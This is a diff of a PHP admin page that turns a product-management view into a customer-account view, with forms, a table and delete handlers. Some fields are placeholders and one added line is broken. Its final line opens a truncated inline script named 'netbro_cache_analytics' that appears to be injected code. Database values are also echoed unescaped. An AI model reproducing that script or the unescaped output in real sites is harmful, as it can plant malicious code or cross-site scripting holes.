@@ -51,8 +51,6 @@
     <link href="<?php echo base_url();?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.css" rel="stylesheet" />
     <link href="<?php echo base_url();?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
     <link href="<?php echo base_url();?>assets/node_modules/multiselect/css/multi-select.css" rel="stylesheet" type="text/css" />
-
-
     <!-- <link href="<?php echo base_url();?>assets/dist/css/pages/floating-label.css" rel="stylesheet"> -->
     <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -63,7 +61,7 @@
  <style type="text/css">
     .select2{
          display: block;
-          width: 100% !important;
+          width: 100%;
           padding: 0.375rem 0.75rem;
           font-size: 0.875rem;
           line-height: 1.5;
@@ -147,14 +145,14 @@
                         <!-- ============================================================== -->
                         <div class="row page-titles">
                             <div class="col-md-5 align-self-center">
-                                <h4 class="text-themecolor">Produk</h4>
+                                <h4 class="text-themecolor">Customer</h4>
                             </div>
                             <div class="col-md-7 align-self-center text-right">
                                 <div class="d-flex justify-content-end align-items-center">
                                     <ol class="breadcrumb">
                                         <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
-                                        <li class="breadcrumb-item">Produk</li>
-                                        <li class="breadcrumb-item active">Add Produk</li>
+                                        <li class="breadcrumb-item">Customer</li>
+                                        <li class="breadcrumb-item active">Add Customer</li>
                                     </ol>
                                     <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                 </div>
@@ -163,13 +161,13 @@
                         <!-- ============================================================== -->
                         <!-- End Bread crumb and right sidebar toggle -->
                         <!-- ============================================================== --> 
-                        <a href="<?php echo base_url('admin-area/produk') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Produk</button></a>   
+                        <a href="<?php echo base_url('admin-area/customer') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Produk</button></a>   
                             <div class="row">
                                 <div class="col-12">
                                     <div class="card">
                                         <div class="card-body">
-                                            <h4 class="card-title">Add Produk</h4>
-                                            <h6 class="card-subtitle">Add Produk </h6>
+                                            <h4 class="card-title">Add Customer</h4>
+                                            <h6 class="card-subtitle">Add new Customer/User </h6>
 
                                             <!-- Notif Status-->
                                             <?php if ($status_action == 'email'): ?>
@@ -180,164 +178,103 @@
                                             <?php endif ?>
 
 
-                                            <form class="m-t-40" action="<?php echo base_url('admin-area/create-produk'); ?>" method="post" enctype="multipart/form-data" novalidate>
+                                            <form class="m-t-40" action="<?php echo base_url('admin-area/create-customer-account'); ?>" method="post" enctype="multipart/form-data" novalidate>
 
-                                            <div class="row">
-                                              
-                                                 
-                                                   <div class="col-md-5" id="form-kiri">
-                                                       <div class="form-group">
-                                                            <h5>Image Product <span class="text-danger">*</span></h5>
-                                                            <div class="controls">
-                                                            <input type="file" id="input-file-now-custom-3" name="gambar_produk" class="dropify" data-height="300" class="form-control"  >
-                                                            </div>
-
+                                        <div class="row">
+                                          
+                                             
+                                               <div class="col-5" id="form-kiri">
+                                                   <div class="form-group">
+                                                        <h5>Pilih Foto Profil <span class="text-danger">*</span></h5>
+                                                        <div class="controls">
+                                                        <input type="file" id="input-file-now-custom-3" name="photo" class="dropify" data-height="300" class="form-control"  >
                                                         </div>
 
-                                                        <style type="text/css">
-                                                            .bootstrap-tagsinput{
-                                                                width: 100%;
-                                                            }
-                                                        </style>
-                                                        <div class="form-group">
-                                                            <h5>Tags</h5>                                                             
-                                                        <div class="tags-default">
-                                                            <input type="text" name="tags" value="" data-role="tagsinput" placeholder="add tags" />
-                                                        </div>
+                                                    </div>
+                                                   <div class="form-group">
+                                                    <div class="tags-default">
+                                                        <input type="text" value="Amsterdam,Washington" data-role="tagsinput" placeholder="add tags" />
                                                        </div>
                                                    </div>
-                                                
-                                                    <div class="col-md-7" id="form-kanan">
-                                                       <div class="form-group">
-                                                           <div class="row">
-                                                            <div class="col-lg-2 col-6">
-                                                                <h5>Visible</h5> 
-                                                                <input type="checkbox" name="visible" value="1"  class="js-switch" data-color="#009efb" />
+                                               </div>
+                                            
+                                                <div class="col-7" id="form-kanan">
+                                                   <div class="form-group">
+                                                       <div class="row">
+                                                        <div class="col-2">
+                                                            Visible <input type="checkbox" checked class="js-switch" data-color="#009efb" />
+                                                        </div>
+                                                        <div class="col-2">
+                                                           Featured <input type="checkbox" checked class="js-switch" data-color="#009efb" />
+                                                        </div>
+                                                       </div>
+                                                    </div>
+                                                    <div class="form-group">
+                                                        
+                                                            <h5>Category<span class="text-danger">*</span></h5>
+                                                            <select class="selectpicker" data-style="form-control btn-secondary">
+                                                                <option>Mustard</option>
+                                                                <option>Ketchup</option>
+                                                                <option>Relish</option>
+                                                            </select>
+                                                                                                        
+                                                    </div>
+                                                    <div class="form-group">
+                                                     <div class="row">  
+                                                        <div class="col-6">                                              <h5>Manufacturer SKU<span class="text-danger">*</span></h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
                                                             </div>
-                                                            <div class="col-lg-4 col-6">
-                                                               <h5>Featured </h5> 
-                                                               <input type="checkbox" value="1" name="featured" class="js-switch" data-color="#009efb" />
-                                                            </div>
-                                                           </div>
                                                         </div>
                                                         
-                                                        <div class="form-group">
-                                                            <div class="row">
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
-                                                            <h5>Category<span class="text-danger">*</span></h5>
-                                                            <select  name="kategori" class="select2 form-control custom-select" style="height: 38px !important; " required>
-                                                                <option value="0">-- Select Option</option>
+                                                        <div class="col-6">                                              <h5>Local CODE</h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
+                                                            </div>
+                                                        </div>
+                                                       </div>  
 
-                                                                <?php foreach ($data_kategori as $value): ?>
-                                                                     <option value="<?php echo $value->id ?>"><?php echo $value->nama_kategori ?></option>
-                                                                <?php endforeach ?>
+                                                      
+                                                    </div> 
+                                                    
+                                                    <div class="form-group">
+                                                     <div class="row">  
+                                                        <div class="col-4">                                              <h5>List Price</h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
+                                                            </div>
+                                                        </div>
+                                                        
+                                                        <div class="col-3">                                              <h5>Stock</h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
+                                                            </div>
+                                                        </div>
+                                                         
+                                                         <div class="col-3">                                              <h5>Brand<span class="text-danger">*</span></h5>
+                                                            <div class="controls">
+                                                                <select class="selectpicker" data-style="form-control btn-secondary">
+                                                                <option>Mustard</option>
+                                                                <option>Ketchup</option>
+                                                                <option>Relish</option>
                                                             </select>
                                                             </div>
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">   
-
-                                                                <h5>Brand<span class="text-danger">*</span></h5>
-                                                                <select  name="brand" class="select2 form-control custom-select" style="height: 38px !important; " required>
-                                                                    <option value="0">-- Select Option</option>
-
-                                                                    <?php foreach ($data_brand as $value): ?>
-                                                                         <option value="<?php echo $value->id ?>"><?php echo $value->nama_brand ?></option>
-                                                                    <?php endforeach ?>
-                                                                </select>
-                                                            </div>
-                                                            </div>
-                                                                                                            
                                                         </div>
-                                                        
-
-                                                        <div class="row">  
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">             
-                                                                <div class="form-group">                                 
-                                                                <h5>Manufacturer SKU<span class="text-danger">*</span></h5>
-                                                                <div class="controls">
-                                                                    <input type="text" name="sku"  class="form-control" required data-validation-required-message="This field is required">
-                                                                </div>
-                                                                </div>
-                                                            </div>
-                                                            
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6"> 
-                                                                <div class="form-group">                                 
-
-                                                                <h5>Local CODE</h5>
-                                                                <div class="controls">
-                                                                    <input type="text" name="local_code"  class="form-control" required data-validation-required-message="This field is required">
-                                                                </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>  
-
-                                                          
-                                                      
-                                                        
-                                                        <div class="row">  
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
-                                                            <div class="form-group">                                 
-
-                                                                <h5>List Price</h5>
-                                                                <div class="controls">
-                                                                    <div class="controls">
-                                                                    <input id="tch2" type="number" value="0" name="harga" class=" form-control" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
-                                                                    </div>
-                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
-                                                                </div>
-                                                            </div>
-                                                            </div>
-                                                            
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">                          
-                                                                <div class="form-group">                                 
-
-                                                                <h5>Stock</h5>
-                                                                <div class="controls">
-                                                                    <input id="tch3" type="number" value="0" name="stok" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
-                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
-                                                                </div>
-                                                                </div>
-                                                            </div>
-                                                             
-                                                             
-                                                             
-                                                        </div> 
-                                                        <div class="row">
-                                                        <div class="col-md-12 col-sm-12 col-12 col-lg-12">             
-                                                            <div class="form-group">                                 
-                                                            <h5>Short Description<span class="text-danger">*</span></h5>
-                                                            <div class="controls">
-                                                                <input type="text" name="short"  class="form-control" required data-validation-required-message="This field is required">
-                                                            </div>
-                                                            </div>
-                                                        </div>
-                                                        
-
-
-                                                        </div>
-                                                        
-                                                        
-                                                        
-                                                        
-                                                        
-                                                        
-                                                        
-                                                   </div>  
-                                                     
-                                                <div class="col-6">
-                                                    <h5>Spesification</h5>
+                                                         
+                                                       </div> 
+                                                    </div> 
+                                                    
+                                                    
                                                     <div class="form-group">
-                                                        <textarea id="editor1" name="spesification" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."></textarea>
+                                                        <textarea class="textarea_editor form-control" rows="15" placeholder="Enter text ..."></textarea>
                                                     </div>
-                                               
-                                                </div>
-                                                <div class="col-6">
-                                                    <h5>Description</h5>
-                                                    <div class="form-group">
-                                                        <textarea id="editor2" name="description" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."></textarea>
-                                                    </div>
-                                               
-                                                </div>                       
-                                            </div>                                                                   
+                                                    
+                                                    
+                                                    
+                                                    
+                                               </div>     
+                                                                            
+                                        </div>                                                                   
                                                 <div class="text-xs-right">
                                                     <button type="submit" class="btn btn-info">Submit</button>
                                                     <button type="reset" class="btn btn-inverse">Cancel</button>
@@ -347,13 +284,10 @@
                                         </div>
                                     </div>
                                 </div>
-                                 
                             </div>
-
 
                     <?php } ?>
                     <!-- End Create Data -!>
-
 
 
                     <!-- Read data -->
@@ -363,13 +297,13 @@
                         <!-- ============================================================== -->
                         <div class="row page-titles">
                             <div class="col-md-5 align-self-center">
-                                <h4 class="text-themecolor">Manage Produk</h4>
+                                <h4 class="text-themecolor">Customer Account</h4>
                             </div>
                             <div class="col-md-7 align-self-center text-right">
                                 <div class="d-flex justify-content-end align-items-center">
                                     <ol class="breadcrumb">
                                         <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
-                                        <li class="breadcrumb-item">Produk</li>
+                                        <li class="breadcrumb-item">Customer Account</li>
                                         <li class="breadcrumb-item active">Manage Produk</li>
                                     </ol>
                                     <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
@@ -381,13 +315,13 @@
                         <!-- ============================================================== -->    
 
 
-                        <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add Produk</button></a>
+                        <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add Customer</button></a>
                         <div class="row">
                             <div class="col-md-12">
                                 <div class="card">
                                     <div class="card-body">
                                         <h4 class="card-title">Manage Produk</h4>
-                                        <h6 class="card-subtitle">Produk Data</h6>
+                                        <h6 class="card-subtitle">Customer Data</h6>
                                         <hr>
 
                                         <!-- Notif Status-->
@@ -418,67 +352,46 @@
                                                 <thead>
                                                     <tr >
                                                         <th>No</th>
-                                                        <th>SKU</th>
-                                                        <th>Image</th>
-                                                        <th>Short Desc</th>
-                                                        <th>Kategori</th>
-                                                        <th>Brand</th>
-                                                        <th>Harga</th>
-                                                        <th>Jumlah/Stok</th>
-                                                        <th>visible</th>
-                                                        <th>featured</th>       
-                                                        <th>tags</th>
+                                                        <th>Nama</th>
+                                                        <th>Email</th>
+                                                        <th>Perusahaan</th>
+                                                        <th>Level</th>
+                                                        <th>Status</th>
+                                                        <th>Media Sosial</th>
+                                                        <th>Alamat</th>
+                                                        <th>No Telp</th>
+                                                        <th>Jenis Kelamin</th>
                                                         
                                                         <th scope="col">Aksi</th>
                                                     </tr>
                                                 </thead>
                                                 <tbody>
-                                                <?php $no=1; foreach ($data_produk as $produk_data): ?>
-                                                    <tr data-id="<?php echo $produk_data->id ;?>" role="row">
-                                                        <td><?php echo $no++ ; ?></td>
-                                                        <td id="sku"><?php echo $produk_data->sku; ?></td>
-                                                        <td><img src="<?php echo base_url();?>my-assets/image/product/<?php echo $produk_data->gambar_produk ; ?>" alt="<?php echo $produk_data->gambar_produk ; ?>" width="40" class="img-circle"></td>
+                                                <?php $no=1; foreach ($customers as $data_customers): ?>
+
+                                                    <tr data-id="<?php echo $data_customers->id ;?>">
+                                                        <td><?php echo $no++; ?></td>
+                                                        <td id="nama_customer"><img src="<?php echo base_url();?>my-assets/image/customers/<?php echo $data_customers->photo ; ?>" alt="<?php echo $data_customers->photo ; ?>" width="40" class="img-circle"> <?php echo $data_customers->nama ; ?></td>
+                                                        <td><?php echo $data_customers->email; ?></td>
+                                                        <td><?php echo $data_customers->perusahaan; ?></td>
+                                                        <td><?php echo $data_customers->level; ?></td>
+                                                        <td><?php if($data_customers->status == 1) echo "Aktif"; else echo "Nonaktif"; ?></td>
+                                                        <td><?php echo $data_customers->media_sosial; ?></td>
+                                                        <td><?php echo $data_customers->alamat; ?></td>
+                                                        <td><?php echo $data_customers->no_telp; ?></td>
+                                                        <td><?php if($data_customers->jenis_kelamin == 'L') echo "Laki - Laki"; else echo "Perempuan"; ?></td>
                                                         <td>
-                                                                <div style="width:250px;padding: 5px; overflow:scroll;overflow-y: hidden;">
-                                                                     <?php echo $produk_data->short_deskripsi ?>
+                                                            <a href="?action=edit&id=<?php echo $data_customers->id ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Edit"><i class="fa fa-edit" aria-hidden="true"></i></button></a>
 
-                                                                </div>
-                                                        </td>
-                                                        <td><?php 
-
-                                                        $kategori = $this->Category_model->get_where($produk_data->id_kategori ) ;
-                                                        foreach ($kategori as $kategori) {
-                                                            echo $kategori->nama_kategori;
-                                                        }
-                                                        ?></td>
-                                                        <td><?php 
-                                                        $brand = $this->Brand_model->get_where($produk_data->id_brand ) ;
-                                                        foreach ($brand as $brand) {
-                                                            echo $brand->nama_brand;
-                                                        }
+                                                            <button type="button" data-id="<?php echo $data_customers->id ;?>" data-name="<?php echo $data_customers->nama ;?>" data-photo="<?php echo $data_customers->photo ;?>" class="btn btn-sm btn-icon btn-danger btn-outline delete-row-btn hapus-customer" data-toggle="tooltip" data-original-title="Delete" ><i class="ti-trash" aria-hidden="true"></i></button>
 
 
-                                                        ?></td>
-                                                        <td><?php echo 'Rp. '. number_format($produk_data->harga) ; ?></td>
-                                                        <td><?php echo $produk_data->stok ; ?></td>
-                                                        <td><?php if($produk_data->visible == 1) echo '<span class="label label-success">ON</span>'; else echo '<span class="label label-danger">OFF</span>' ; ?></td>
-                                                        <td><?php if($produk_data->featured == 1) echo '<span class="label label-success">ON</span>'; else echo '<span class="label label-danger">OFF</span>'; ?></td>
-                                                        <td>
-                                                        <?php echo $produk_data->tags ; ?>        
+
                                                         </td>
                                                         
-                                                        <td>
-
-                                                            <a href="?action=edit&id=<?php echo $produk_data->id ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Edit"><i class="fa fa-edit" aria-hidden="true"></i></button></a>
-
-                                                            <button type="button" data-id="<?php echo $produk_data->id ;?>" data-name="<?php echo $produk_data->sku ;?>" data-photo="<?php echo $produk_data->gambar_produk ;?>" class="btn btn-sm btn-icon btn-danger btn-outline delete-row-btn hapus-produk" data-toggle="tooltip" data-original-title="Delete" ><i class="ti-trash" aria-hidden="true"></i></button>
-
-                                                            
-
-                                                        </td>
                                                     </tr>
+
+                                                    
                                                 <?php endforeach ?>
-                                                
                                                
                                                     
                                                   
@@ -515,13 +428,13 @@
                         <!-- ============================================================== -->
                         <!-- End Bread crumb and right sidebar toggle -->
                         <!-- ============================================================== --> 
-                        <a href="<?php echo base_url('admin-area/produk') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Produk</button></a>   
+                        <a href="<?php echo base_url('admin-area/customer') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Produk</button></a>   
                             <div class="row">
                                 <div class="col-12">
                                     <div class="card">
                                         <div class="card-body">
-                                            <h4 class="card-title">Add Produk</h4>
-                                            <h6 class="card-subtitle">Add Produk </h6>
+                                            <h4 class="card-title">Add Customer</h4>
+                                            <h6 class="card-subtitle">Add new Customer/User </h6>
 
                                             <!-- Notif Status-->
                                             <?php if ($status_action == 'email'): ?>
@@ -532,173 +445,107 @@
                                             <?php endif ?>
 
 
-                                            <form class="m-t-40" action="<?php echo base_url('admin-area/update-produk'); ?>" method="post" enctype="multipart/form-data" novalidate>
-                                                    
-                                            <?php foreach ($data_produk_edit as $data_edit ): ?>
+                                            <form class="m-t-40" action="<?php echo base_url('admin-area/create-customer-account'); ?>" method="post" enctype="multipart/form-data" novalidate>
 
+                                        <div class="row">
+                                          
+                                             
+                                               <div class="col-5" id="form-kiri">
+                                                   <div class="form-group">
+                                                        <h5>Pilih Foto Profil <span class="text-danger">*</span></h5>
+                                                        <div class="controls">
+                                                                                                            
+                                                       <input type="file" id="input-file-now-custom-3" class="dropify" data-height="300" data-default-file="../assets/node_modules/dropify/src/images/test-image-2.jpg">
+                                                       
+                                                       
+                                                       
+                                                       </div>
 
-                                            <div class="row">
-                                              
-                                                 
-                                                   <div class="col-md-5" id="form-kiri">
-                                                       <div class="form-group">
-                                                            <h5>Image Product <span class="text-danger">*</span></h5>
-                                                            <div class="controls">
-                                                            <input type="file" id="input-file-now-custom-3" data-default-file="<?php echo base_url(); ?>my-assets/image/product/<?php echo $data_edit->gambar_produk; ?>" name="gambar_produk" class="dropify" data-height="300" class="form-control"  >
-                                                            <input type="hidden" name="gambar_lama" value="<?php echo $data_edit->gambar_produk; ?>">
-                                                            <input type="hidden" name="id" value="<?php echo $data_edit->id ?>">
-                                                            </div>
-
-                                                        </div>
-
-                                                        <style type="text/css">
-                                                            .bootstrap-tagsinput{
-                                                                width: 100%;
-                                                            }
-                                                        </style>
-                                                        <div class="form-group">
-                                                            <h5>Tags</h5>                                                             
-                                                        <div class="tags-default">
-                                                            <input type="text" name="tags" value="<?php echo $data_edit->tags; ?>" data-role="tagsinput" placeholder="add tags" />
-                                                        </div>
+                                                    </div>
+                                                   <div class="form-group">
+                                                    <div class="tags-default">
+                                                        <input type="text" value="Amsterdam,Washington" data-role="tagsinput" placeholder="add tags" />
                                                        </div>
                                                    </div>
-                                                
-                                                    <div class="col-md-7" id="form-kanan">
-                                                       <div class="form-group">
-                                                           <div class="row">
-                                                            <div class="col-lg-2 col-6">
-                                                                <h5>Visible</h5> 
-                                                                <input type="checkbox" name="visible" value="1" <?php if($data_edit->visible == 1 ) echo 'checked' ;?> class="js-switch" data-color="#009efb" />
+                                               </div>
+                                            
+                                                <div class="col-7" id="form-kanan">
+                                                   <div class="form-group">
+                                                       <div class="row">
+                                                        <div class="col-2">
+                                                            Visible <input type="checkbox" checked class="js-switch" data-color="#009efb" />
+                                                        </div>
+                                                        <div class="col-2">
+                                                           Featured <input type="checkbox" checked class="js-switch" data-color="#009efb" />
+                                                        </div>
+                                                       </div>
+                                                    </div>
+                                                    <div class="form-group">
+                                                        
+                                                            <h5>Category<span class="text-danger">*</span></h5>
+                                                            <select class="selectpicker" data-style="form-control btn-secondary">
+                                                                <option>Mustard</option>
+                                                                <option>Ketchup</option>
+                                                                <option>Relish</option>
+                                                            </select>
+                                                                                                        
+                                                    </div>
+                                                    <div class="form-group">
+                                                     <div class="row">  
+                                                        <div class="col-6">                                              <h5>Manufacturer SKU<span class="text-danger">*</span></h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
                                                             </div>
-                                                            <div class="col-lg-4 col-6">
-                                                               <h5>Featured </h5> 
-                                                               <input type="checkbox" value="1" <?php if($data_edit->featured == 1 ) echo 'checked' ;?> name="featured" class="js-switch" data-color="#009efb" />
-                                                            </div>
-                                                           </div>
                                                         </div>
                                                         
-                                                        <div class="form-group">
-                                                            <div class="row">
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
-                                                            <h5>Category<span class="text-danger">*</span></h5>
-                                                            <select  name="kategori" class="select2 form-control custom-select" style="height: 38px !important; " required>
-                                                                <option value="0">-- Select Option</option>
+                                                        <div class="col-6">                                              <h5>Local CODE</h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
+                                                            </div>
+                                                        </div>
+                                                       </div>  
 
-                                                                <?php foreach ($data_kategori as $value): ?>
-                                                                     <option <?php if($data_edit->id_kategori == $value->id ) echo 'selected' ;?> value="<?php echo $value->id ?>"><?php echo $value->nama_kategori ?></option>
-                                                                <?php endforeach ?>
+                                                      
+                                                    </div> 
+                                                    
+                                                    <div class="form-group">
+                                                     <div class="row">  
+                                                        <div class="col-4">                                              <h5>List Price</h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
+                                                            </div>
+                                                        </div>
+                                                        
+                                                        <div class="col-3">                                              <h5>Stock</h5>
+                                                            <div class="controls">
+                                                                <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required">
+                                                            </div>
+                                                        </div>
+                                                         
+                                                         <div class="col-3">                                              <h5>Brand<span class="text-danger">*</span></h5>
+                                                            <div class="controls">
+                                                                <select class="selectpicker" data-style="form-control btn-secondary">
+                                                                <option>Mustard</option>
+                                                                <option>Ketchup</option>
+                                                                <option>Relish</option>
                                                             </select>
                                                             </div>
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">   
-
-                                                                <h5>Brand<span class="text-danger">*</span></h5>
-                                                                <select  name="brand" class="select2 form-control custom-select" style="height: 38px !important; " required>
-                                                                    <option value="0">-- Select Option</option>
-
-                                                                    <?php foreach ($data_brand as $value_brand): ?>
-                                                                         <option <?php if($data_edit->id_brand == $value_brand->id ) echo 'selected' ;?>  value="<?php echo $value_brand->id ?>"><?php echo $value_brand->nama_brand ?></option>
-                                                                    <?php endforeach ?>
-                                                                </select>
-                                                            </div>
-                                                            </div>
-                                                                                                            
                                                         </div>
-                                                        
-
-                                                        <div class="row">  
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">             
-                                                                <div class="form-group">                                 
-                                                                <h5>Manufacturer SKU<span class="text-danger">*</span></h5>
-                                                                <div class="controls">
-                                                                    <input type="text" name="sku" value="<?php echo $data_edit->sku; ?>" class="form-control" required data-validation-required-message="This field is required">
-                                                                </div>
-                                                                </div>
-                                                            </div>
-                                                            
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6"> 
-                                                                <div class="form-group">                                 
-
-                                                                <h5>Local CODE</h5>
-                                                                <div class="controls">
-                                                                    <input type="text" name="local_code" value="<?php echo $data_edit->local_code; ?>"  class="form-control" required data-validation-required-message="This field is required">
-                                                                </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>  
-
-                                                          
-                                                      
-                                                        
-                                                        <div class="row">  
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
-                                                            <div class="form-group">                                 
-
-                                                                <h5>List Price</h5>
-                                                                <div class="controls">
-                                                                    <div class="controls">
-                                                                    <input id="tch2" type="number" value="<?php echo $data_edit->harga; ?>" name="harga" class=" form-control" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
-                                                                    </div>
-                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
-                                                                </div>
-                                                            </div>
-                                                            </div>
-                                                            
-                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">                          
-                                                                <div class="form-group">                                 
-
-                                                                <h5>Stock</h5>
-                                                                <div class="controls">
-                                                                    <input id="tch3" type="number" value="<?php echo $data_edit->stok; ?>" name="stok" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
-                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
-                                                                </div>
-                                                                </div>
-                                                            </div>
-                                                             
-                                                             
-                                                             
-                                                        </div> 
-                                                        <div class="row">
-                                                        <div class="col-md-12 col-sm-12 col-12 col-lg-12">             
-                                                            <div class="form-group">                                 
-                                                            <h5>Short Description<span class="text-danger">*</span></h5>
-                                                            <div class="controls">
-                                                                <input type="text" name="short" value="<?php echo $data_edit->short_deskripsi; ?>" class="form-control" required data-validation-required-message="This field is required">
-                                                            </div>
-                                                            </div>
-                                                        </div>
-                                                        
-
-
-                                                        </div>
-                                                        
-                                                        
-                                                        
-                                                        
-                                                        
-                                                        
-                                                        
-                                                   </div>  
-                                                     
-                                                <div class="col-6">
-                                                    <h5>Spesification</h5>
+                                                         
+                                                       </div> 
+                                                    </div> 
+                                                    
+                                                    
                                                     <div class="form-group">
-                                                        <textarea id="editor1" name="spesification" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."><?php echo $data_edit->spesification; ?></textarea>
+                                                        <textarea class="textarea_editor form-control" rows="15" placeholder="Enter text ..."></textarea>
                                                     </div>
-                                               
-                                                </div>
-                                                <div class="col-6">
-                                                    <h5>Description</h5>
-                                                    <div class="form-group">
-                                                        <textarea id="editor2" name="description" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."><?php echo $data_edit->description; ?></textarea>
-                                                    </div>
-                                               
-                                                </div>                       
-                                            </div> 
-
-                                            <?php endforeach ?>
-
-
+                                                    
+                                                    
+                                                    
+                                                    
+                                               </div>     
+                                                                            
+                                        </div>                                                                   
                                                 <div class="text-xs-right">
                                                     <button type="submit" class="btn btn-info">Submit</button>
                                                     <button type="reset" class="btn btn-inverse">Cancel</button>
@@ -708,9 +555,7 @@
                                         </div>
                                     </div>
                                 </div>
-                                 
                             </div>
-
 
 
                     <?php } ?>
@@ -835,25 +680,12 @@
     <!--Custom JavaScript -->
     <script src="<?php echo base_url();?>assets/dist/js/custom.min.js"></script>
     <script src="<?php echo base_url();?>assets/dist/js/pages/validation.js"></script>
-    <!-- CKEDITOR -->
-    <script src="<?php echo base_url() ?>assets/ckeditor/ckeditor.js"></script>
 
     <!-- ============================================================== -->
     <!-- This page plugins -->
-    <!-- CK EDITOR SCRIPT-->
-    <script>
-        // Replace the <textarea id="editor1"> with a CKEditor
-        // instance, using default configuration.
-        CKEDITOR.replace( 'editor1' ,{
-        filebrowserImageBrowseUrl : 'kcfinder'
-    });
-        CKEDITOR.replace( 'editor2',{
-        filebrowserImageBrowseUrl : 'kcfinder'
-    } );
-    </script>
     <!-- This is data table -->
     <script src="<?php echo base_url();?>assets/node_modules/datatables/jquery.dataTables.min.js"></script>
-    
+    cript>
 
     <script>
     $(document).ready(function() {
@@ -910,7 +742,7 @@
         
     $(document).ready(function() {
 
-        $('.textarea_editors').wysihtml5();
+        $('.textarea_editor').wysihtml5();
 
 
     });
@@ -976,7 +808,7 @@
 
     <script type="text/javascript">
 
-    $(document).on("click",".hapus-produk",function(){
+    $(document).on("click",".hapus-customer",function(){
     
     $.ajaxSetup({
       type:"post",
@@ -987,8 +819,6 @@
     var id=$(this).attr("data-id");
     // var nama=$(this).attr("data-name");
     var photo=$(this).attr("data-photo");
-
-    // alert(id+' _' + photo);
 
 
         swal({   
@@ -1005,14 +835,14 @@
             if (isConfirm) {  
                 $.ajax({
                 data:{id:id,photo:photo},
-                url:"<?php echo base_url('Admin-area/delete-produk');?>",
+                url:"<?php echo base_url('Admin-area/delete-customer');?>",
                 success: function(html) {
                     $("tr[data-id='"+id+"']").fadeOut(1500,function(){
                         $(this).remove();
                     });
                     swal({   
                         title: "Deleted !",   
-                        text: "Sukses dihapus",   
+                        text: "Admin sukses dihapus",   
                         type: "success",       
                         confirmButtonText: "Ok",    
                         closeOnConfirm: false,   
@@ -1074,14 +904,14 @@
             maxboostedstep: 10,
             postfix: '%'
         });
-        $("input[name='price']").TouchSpin({
-            min: 0,
+        $("input[name='tch2']").TouchSpin({
+            min: -1000000000,
             max: 1000000000,
             stepinterval: 50,
             maxboostedstep: 10000000,
-            prefix: 'Rp'
+            prefix: '$'
         });
-        $("input[name='stok']").TouchSpin();
+        $("input[name='posisi']").TouchSpin();
         $("input[name='tch3_22']").TouchSpin({
             initval: 40
         });
@@ -1219,9 +1049,6 @@ $(this).find("textarea[class~='editor']").fadeIn(1000).focus();
             });
         });
         </script>
-
-
-
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();call
